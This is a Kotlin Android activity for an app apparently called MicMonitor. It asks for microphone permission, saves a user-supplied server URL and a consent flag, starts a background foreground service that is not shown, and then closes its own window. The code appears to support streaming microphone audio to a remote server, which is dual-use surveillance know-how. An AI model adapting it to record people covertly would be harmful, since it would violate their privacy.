package com.micmonitor.app

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val prefs by lazy {
        getSharedPreferences("micmonitor", Context.MODE_PRIVATE)
    }

    // All permissions needed
    private val requiredPermissions: Array<String>
        get() {
            val perms = mutableListOf(Manifest.permission.RECORD_AUDIO)
            // POST_NOTIFICATIONS requires Android 13+
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                perms.add(Manifest.permission.POST_NOTIFICATIONS)
            }
            return perms.toTypedArray()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val btnGrant    = findViewById<Button>(R.id.btnGrant)
        val tvStatus    = findViewById<TextView>(R.id.tvStatus)
        val etServerUrl = findViewById<EditText>(R.id.etServerUrl)

        // Pre-fill saved server URL
        val savedUrl = prefs.getString("server_url", MicService.DEFAULT_SERVER_URL) ?: MicService.DEFAULT_SERVER_URL
        etServerUrl.setText(savedUrl)

        // If already consented and has permissions, just let them update the URL
        if (prefs.getBoolean("consent_given", false) && hasAllPermissions()) {
            btnGrant.text = "Save URL & Restart Service"
            tvStatus.text = "Service is running. Update URL if needed."
            tvStatus.setTextColor(0xFF4CAF50.toInt())
        }

        btnGrant.setOnClickListener {
            // Save the server URL first
            val url = etServerUrl.text.toString().trim()
            if (url.isNotEmpty()) {
                prefs.edit().putString("server_url", url).apply()
            }

            if (prefs.getBoolean("consent_given", false) && hasAllPermissions()) {
                // Restart service with new URL
                stopService(Intent(this, MicService::class.java))
                launchService()
                Toast.makeText(this, "Service restarted with new URL", Toast.LENGTH_SHORT).show()
                finish()
            } else {
                tvStatus.text = "Requesting permissions..."
                ActivityCompat.requestPermissions(this, requiredPermissions, REQUEST_CODE)
            }
        }
    }

    private fun hasAllPermissions(): Boolean {
        return requiredPermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == REQUEST_CODE) {
            // Check RECORD_AUDIO specifically (mandatory)
            val micIndex = permissions.indexOf(Manifest.permission.RECORD_AUDIO)
            val micGranted = micIndex >= 0 && grantResults[micIndex] == PackageManager.PERMISSION_GRANTED

            if (micGranted) {
                // Save consent permanently
                prefs.edit().putBoolean("consent_given", true).apply()
                launchService()
                finish()
            } else {
                Toast.makeText(
                    this,
                    "Microphone permission is required. Please tap Grant again.",
                    Toast.LENGTH_LONG
                ).show()
                findViewById<TextView>(R.id.tvStatus).text =
                    "Microphone permission denied. Please allow it."
            }
        }
    }

    private fun launchService() {
        val intent = Intent(this, MicService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    companion object {
        private const val REQUEST_CODE = 1001
    }
}
